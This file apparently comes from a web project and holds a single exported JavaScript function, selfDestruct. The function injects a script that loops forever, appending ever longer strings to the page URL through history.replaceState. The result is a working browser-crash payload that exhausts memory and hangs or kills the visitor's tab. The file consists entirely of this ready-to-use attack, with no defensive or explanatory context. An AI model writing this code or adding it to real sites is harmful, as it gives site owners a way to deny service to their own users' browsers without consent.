export const selfDestruct = () => {
	history.pushState(undefined, '', location.href);
	document.write(
		`<script>let s='_'.repeat(10000),t=s;for(;;)history.replaceState(0,0,t+=s)</script>`,
	);
};
